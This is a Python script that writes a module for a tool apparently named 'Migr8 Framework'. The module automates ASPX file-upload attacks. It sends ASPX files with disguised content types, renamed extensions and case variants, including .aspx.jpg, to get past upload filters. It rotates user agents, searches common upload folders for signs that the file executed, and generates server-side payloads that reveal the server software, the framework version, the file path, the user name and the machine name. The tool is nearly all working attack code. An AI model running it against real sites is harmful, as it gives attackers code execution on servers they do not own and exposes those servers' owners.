# Create aspx_checker.py core module - fixed version
aspx_checker_code = '''"""
ASPX Checker Module for Migr8 Framework
Specialized upload and verification tests for ASPX files
"""

import requests
import os
import time
from urllib.parse import urljoin
from ..utils.logger import logger
from ..utils.bypasses import USER_AGENTS, BYPASS_EXTENSIONS
import random

class AspxChecker:
    """Specialized testing for ASPX file uploads and execution"""
    
    def __init__(self, timeout=30):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS)
        })
    
    def test_aspx_upload(self, target_url, aspx_file_path, field_name='file'):
        """
        Test ASPX file upload with specialized handling
        
        Args:
            target_url (str): Upload endpoint URL
            aspx_file_path (str): Path to ASPX file
            field_name (str): Form field name
            
        Returns:
            dict: Upload test results
        """
        logger.info(f"Testing ASPX upload: {aspx_file_path}")
        
        if not os.path.exists(aspx_file_path):
            logger.error(f"ASPX file not found: {aspx_file_path}")
            return None
        
        try:
            # Generate unique filename with timestamp
            original_filename = os.path.basename(aspx_file_path)
            timestamp = str(int(time.time()))
            unique_filename = f"test_{timestamp}.aspx"
            
            with open(aspx_file_path, 'rb') as f:
                file_content = f.read()
            
            # Test multiple ASPX-specific upload attempts
            upload_attempts = [
                # Standard ASPX upload
                {
                    'filename': unique_filename,
                    'content_type': 'text/plain',
                    'description': 'Standard ASPX upload'
                },
                # ASPX with alternative content type
                {
                    'filename': unique_filename,
                    'content_type': 'application/octet-stream',
                    'description': 'ASPX with octet-stream content type'
                },
                # ASPX disguised as text
                {
                    'filename': unique_filename.replace('.aspx', '.txt'),
                    'content_type': 'text/plain',
                    'description': 'ASPX disguised as TXT'
                }
            ]
            
            results = []
            
            for attempt in upload_attempts:
                logger.info(f"Attempting: {attempt['description']}")
                
                files = {
                    field_name: (attempt['filename'], file_content, attempt['content_type'])
                }
                
                data = {
                    'submit': 'Upload',
                    'action': 'upload'
                }
                
                response = self.session.post(
                    target_url,
                    files=files,
                    data=data,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                result = {
                    'attempt': attempt['description'],
                    'filename': attempt['filename'],
                    'status_code': response.status_code,
                    'response_length': len(response.content),
                    'content_type': response.headers.get('content-type', ''),
                    'success': self._analyze_aspx_upload_success(response),
                    'response_preview': response.text[:300]
                }
                
                results.append(result)
                
                if result['success']:
                    logger.success(f"ASPX upload successful: {attempt['description']}")
                else:
                    logger.error(f"ASPX upload failed: {attempt['description']}")
            
            return {
                'original_file': aspx_file_path,
                'unique_filename': unique_filename,
                'upload_attempts': results,
                'successful_uploads': [r for r in results if r['success']]
            }
            
        except Exception as e:
            logger.error(f"ASPX upload test failed: {str(e)}")
            return None
    
    def test_aspx_execution(self, base_url, filename):
        """
        Test if uploaded ASPX file executes properly
        
        Args:
            base_url (str): Base URL to check
            filename (str): ASPX filename to test
            
        Returns:
            dict: Execution test results
        """
        logger.info(f"Testing ASPX execution: {filename}")
        
        # Common ASPX upload paths
        aspx_paths = [
            '', 'uploads/', 'upload/', 'files/', 'file/', 'temp/', 'tmp/',
            'bin/', 'App_Data/', 'aspnet_client/', 'admin/uploads/'
        ]
        
        execution_results = []
        
        for path in aspx_paths:
            test_url = urljoin(base_url.rstrip('/') + '/', path + filename)
            
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                
                result = {
                    'url': test_url,
                    'status_code': response.status_code,
                    'content_type': response.headers.get('content-type', ''),
                    'content_length': len(response.content),
                    'executed': self._check_aspx_execution(response),
                    'server_info': self._extract_aspx_server_info(response),
                    'response_preview': response.text[:200]
                }
                
                if response.status_code == 200:
                    if result['executed']:
                        logger.success(f"ASPX execution confirmed: {test_url}")
                    else:
                        logger.warning(f"ASPX accessible but not executed: {test_url}")
                    
                    execution_results.append(result)
                
            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {test_url}: {str(e)}")
                continue
        
        return {
            'filename': filename,
            'execution_tests': execution_results,
            'executed_urls': [r for r in execution_results if r['executed']]
        }
    
    def test_aspx_extensions(self, target_url, base_aspx_file):
        """
        Test ASPX upload with various extensions
        
        Args:
            target_url (str): Upload endpoint  
            base_aspx_file (str): Base ASPX file path
            
        Returns:
            dict: Extension bypass test results
        """
        aspx_extensions = [
            '.aspx', '.asp', '.asa', '.asax', '.ascx', '.ashx', '.asmx',
            '.aspx.txt', '.asp.txt', '.aspx.jpg', '.asp.jpg',
            '.ASPX', '.ASP', '.AsPx', '.AsP'
        ]
        
        logger.info(f"Testing {len(aspx_extensions)} ASPX extensions")
        
        results = []
        base_content = ''
        
        try:
            with open(base_aspx_file, 'r') as f:
                base_content = f.read()
        except Exception as e:
            logger.error(f"Could not read base ASPX file: {str(e)}")
            return None
        
        for ext in aspx_extensions:
            timestamp = str(int(time.time()))
            temp_filename = f"test_{timestamp}{ext}"
            temp_filepath = f"/tmp/{temp_filename}"
            
            try:
                # Create temporary file with extension
                with open(temp_filepath, 'w') as f:
                    f.write(base_content)
                
                # Test upload
                upload_result = self.test_aspx_upload(target_url, temp_filepath)
                
                if upload_result and upload_result['successful_uploads']:
                    result = {
                        'extension': ext,
                        'upload_successful': True,
                        'upload_details': upload_result
                    }
                    results.append(result)  
                    logger.success(f"ASPX extension bypass successful: {ext}")
                
                # Cleanup
                if os.path.exists(temp_filepath):
                    os.remove(temp_filepath)
                    
            except Exception as e:
                logger.debug(f"Error testing extension {ext}: {str(e)}")
                continue
        
        return {
            'base_file': base_aspx_file,
            'extensions_tested': len(aspx_extensions),
            'successful_bypasses': results,
            'bypass_count': len(results)
        }
    
    def generate_aspx_payload(self, payload_type='info'):
        """
        Generate ASPX payload for testing
        
        Args:
            payload_type (str): Type of payload ('info', 'minimal', 'extended')
            
        Returns:
            str: ASPX payload content
        """
        if payload_type == 'minimal':
            payload = '<%@ Page Language="C#" %>\\n'
            payload += '<% Response.Write("ASPX Execution Successful - " + DateTime.Now.ToString()); %>'
            return payload
        
        elif payload_type == 'extended':
            payload = '<%@ Page Language="C#" %>\\n'
            payload += '<%@ Import Namespace="System" %>\\n'
            payload += '<%@ Import Namespace="System.Web" %>\\n'
            payload += '<!DOCTYPE html>\\n<html>\\n<head><title>Migr8 ASPX Test</title></head>\\n<body>\\n'
            payload += '<h2>ASPX Execution Test - Extended</h2>\\n'
            payload += '<script runat="server">\\n'
            payload += 'void Page_Load(object sender, EventArgs e) {\\n'
            payload += '    lblTime.Text = DateTime.Now.ToString();\\n'
            payload += '    lblServer.Text = Request.ServerVariables["SERVER_SOFTWARE"];\\n'
            payload += '    lblFramework.Text = Environment.Version.ToString();\\n'
            payload += '    lblPath.Text = Server.MapPath(".");\\n'
            payload += '    try {\\n'
            payload += '        lblUser.Text = Environment.UserName;\\n'
            payload += '        lblMachine.Text = Environment.MachineName;\\n'
            payload += '    } catch { lblUser.Text = "N/A"; lblMachine.Text = "N/A"; }\\n'
            payload += '}\\n</script>\\n'
            payload += '<p>Current Time: <asp:Label ID="lblTime" runat="server" /></p>\\n'
            payload += '<p>Server Software: <asp:Label ID="lblServer" runat="server" /></p>\\n'
            payload += '<p>.NET Framework: <asp:Label ID="lblFramework" runat="server" /></p>\\n'
            payload += '<p>Current Path: <asp:Label ID="lblPath" runat="server" /></p>\\n'
            payload += '<p>User: <asp:Label ID="lblUser" runat="server" /></p>\\n'
            payload += '<p>Machine: <asp:Label ID="lblMachine" runat="server" /></p>\\n'
            payload += '</body>\\n</html>'
            return payload
        
        else:  # info payload (default)
            payload = '<%@ Page Language="C#" %>\\n'
            payload += '<!-- Migr8 ASPX Test Payload -->\\n'
            payload += '<!DOCTYPE html>\\n<html>\\n<head><title>ASPX Upload Test</title></head>\\n<body>\\n'
            payload += '<h2>ASPX Upload Test Successful</h2>\\n'
            payload += '<script runat="server">\\n'
            payload += 'void Page_Load(object sender, EventArgs e) {\\n'
            payload += '    lblServerInfo.Text = Request.ServerVariables["SERVER_SOFTWARE"];\\n'
            payload += '    lblFramework.Text = Environment.Version.ToString();\\n'
            payload += '    lblCurrentTime.Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");\\n'
            payload += '    lblDirectory.Text = Server.MapPath(".");\\n'
            payload += '}\\n</script>\\n'
            payload += '<p>Server: <asp:Label ID="lblServerInfo" runat="server" /></p>\\n'
            payload += '<p>.NET Framework: <asp:Label ID="lblFramework" runat="server" /></p>\\n'
            payload += '<p>Current Time: <asp:Label ID="lblCurrentTime" runat="server" /></p>\\n'
            payload += '<p>Directory: <asp:Label ID="lblDirectory" runat="server" /></p>\\n'
            payload += '<!-- Migr8 ASPX Test Payload -->\\n'
            payload += '</body>\\n</html>'
            return payload
    
    def _analyze_aspx_upload_success(self, response):
        """Analyze response to determine ASPX upload success"""
        status_code = response.status_code
        content = response.text.lower()
        
        # Success indicators
        success_indicators = [
            'upload successful', 'file uploaded', 'upload complete',
            'successfully uploaded', 'file saved'
        ]
        
        # ASPX-specific error indicators
        aspx_errors = [
            'aspx not allowed', 'invalid file type', 'dangerous file',
            'script files not permitted', 'executable files blocked'
        ]
        
        if status_code in [200, 201, 302]:
            has_success = any(indicator in content for indicator in success_indicators)
            has_aspx_error = any(error in content for error in aspx_errors)
            
            if has_success and not has_aspx_error:
                return True
            elif not has_aspx_error and 'error' not in content:
                return True
        
        return False
    
    def _check_aspx_execution(self, response):
        """Check if ASPX file executed server-side code"""
        if response.status_code != 200:
            return False
        
        content = response.text.lower()
        content_type = response.headers.get('content-type', '').lower()
        
        # ASPX execution indicators
        aspx_indicators = [
            'aspx upload test', '.net framework', 'server software',
            'migr8 aspx test payload', 'current time:', 'server:',
            'aspx execution successful'
        ]
        
        # Check for indicators
        if any(indicator in content for indicator in aspx_indicators):
            return True
        
        # Check content type
        if content_type.startswith('text/html') and any(indicator in content for indicator in ['aspx', 'server', 'framework']):
            return True
        
        return False
    
    def _extract_aspx_server_info(self, response):
        """Extract server information from ASPX response"""
        content = response.text
        server_info = {}
        
        # Extract .NET Framework version
        if '.net framework:' in content.lower():
            try:
                start = content.lower().find('.net framework:') + 15
                end = content.find('</p>', start)
                if end == -1:
                    end = content.find('\\n', start)
                server_info['dotnet_version'] = content[start:end].strip()
            except:
                pass
        
        # Extract server software
        if 'server:' in content.lower():
            try:
                start = content.lower().find('server:') + 7
                end = content.find('</p>', start)
                if end == -1:
                    end = content.find('\\n', start)
                server_info['server_software'] = content[start:end].strip()
            except:
                pass
        
        return server_info
    
    def close(self):
        """Close the session"""
        self.session.close()
'''

with open("migr8/core/aspx_checker.py", 'w') as f:
    f.write(aspx_checker_code)
print("Created: migr8/core/aspx_checker.py")